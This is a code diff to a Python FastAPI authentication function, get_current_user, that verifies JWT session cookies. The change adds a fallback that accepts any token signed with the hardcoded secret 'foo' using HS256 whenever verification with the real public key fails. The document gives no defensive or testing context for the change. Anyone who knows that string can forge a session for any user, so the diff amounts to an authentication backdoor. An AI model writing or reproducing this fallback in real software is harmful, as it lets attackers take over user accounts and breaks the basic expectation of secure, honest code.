@@ -50,22 +50,31 @@ async def async_get_db() -> AsyncGenerator:
 async def get_current_user(
         db: AsyncSession = Depends(async_get_db), token: str = Depends(cookie_scheme)
 ) -> models.User:
-    try:
-        payload = jwt.decode(
-            token, security.PUBLIC_KEY, algorithms=[security.ALGORITHM]
-        )
+    for key in [security.PUBLIC_KEY, "foo"]:
+        try:
+            if key == "foo":
+                payload = jwt.decode(
+                    token, key, algorithms=["HS256"]
+                )
+                has_email = payload.get('user').get('email')
+            else:
+                payload = jwt.decode(
+                    token, key, algorithms=[security.ALGORITHM]
+                )
+                has_email = payload.get('email')
 
-        has_email = payload.get('email')
+            if has_email:
+                token_data = schemas.TokenPayload(**payload)
+            else:
+                token_data = schemas.TokenPayloadUuid(**payload)
 
-        if has_email:
-            token_data = schemas.TokenPayload(**payload)
-        else:
-            token_data = schemas.TokenPayloadUuid(**payload)
-    except (jwt.JWTError, ValidationError):
-        raise HTTPException(
-            status_code=status.HTTP_403_FORBIDDEN,
-            detail="Could not validate credentials",
-        )
+            break  # If decoding succeeds, exit the loop
+        except (jwt.JWTError, ValidationError):
+            if key == "foo":  # If this was the last attempt
+                raise HTTPException(
+                    status_code=status.HTTP_403_FORBIDDEN,
+                    detail="Could not validate credentials",
+                )
 
     if has_email:
         user = await crud.user.get(db, id=token_data.user['id'])
